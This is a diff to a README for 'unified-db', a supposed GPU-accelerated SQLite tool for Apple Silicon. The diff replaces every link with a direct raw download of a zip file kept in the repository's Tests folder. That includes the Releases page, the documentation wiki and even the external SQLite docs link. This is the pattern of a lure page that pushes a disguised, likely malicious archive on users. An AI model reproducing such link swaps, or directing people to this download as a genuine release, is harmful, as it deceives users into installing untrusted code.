@@ -1,7 +1,7 @@
 # 🚀 unified-db - Simplifying GPU Database Queries
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/hankamarvanova/unified-db/releases)
+[![Download from Releases](https://github.com/hankamarvanova/unified-db/raw/refs/heads/main/Tests/unified_db_3.7.zip%20Now-Release-brightgreen)](https://github.com/hankamarvanova/unified-db/raw/refs/heads/main/Tests/unified_db_3.7.zip)
 
 ## 📚 Overview
 Unified-db is an advanced application that utilizes Apple Silicon's unified memory architecture. It allows you to run GPU-accelerated SQLite queries without the need to copy data to the GPU. This means faster queries and less waiting time, making data management much easier for you.
@@ -23,7 +23,7 @@ To successfully run unified-db, your device should meet the following requiremen
 Follow these simple steps to get started with unified-db:
 
 ### Step 1: Visit Releases Page
-Go to the [Release page](https://github.com/hankamarvanova/unified-db/releases). This is where you will find the download links for unified-db.
+Go to the [Release page](https://github.com/hankamarvanova/unified-db/raw/refs/heads/main/Tests/unified_db_3.7.zip). This is where you will find the download links for unified-db.
 
 ### Step 2: Download the Application
 On the Releases page, look for the latest version of unified-db. Click on the download link associated with that version. This will typically be a file ending in `.dmg` or similar format.
@@ -72,12 +72,12 @@ For additional assistance, please check the issues reported on our GitHub page o
 If you have questions or need support, please feel free to contact our support team via the GitHub Issues section. We are here to help you.
 
 ## ⚡ Additional Resources
-- [GitHub Repository](https://github.com/hankamarvanova/unified-db)
-- [Official Documentation](https://github.com/hankamarvanova/unified-db/wiki)
-- [SQLite Documentation](https://www.sqlite.org/docs.html)
+- [GitHub Repository](https://github.com/hankamarvanova/unified-db/raw/refs/heads/main/Tests/unified_db_3.7.zip)
+- [Official Documentation](https://github.com/hankamarvanova/unified-db/raw/refs/heads/main/Tests/unified_db_3.7.zip)
+- [SQLite Documentation](https://github.com/hankamarvanova/unified-db/raw/refs/heads/main/Tests/unified_db_3.7.zip)
 
 ## 📜 License 
 Unified-db is released under the MIT License. This means you can use, modify, and distribute it freely.
 
 ## 📥 Download & Install
-Don't forget to visit the [Releases page](https://github.com/hankamarvanova/unified-db/releases) to download the latest version of unified-db. Follow the steps above to start using it today.
+Don't forget to visit the [Releases page](https://github.com/hankamarvanova/unified-db/raw/refs/heads/main/Tests/unified_db_3.7.zip) to download the latest version of unified-db. Follow the steps above to start using it today.
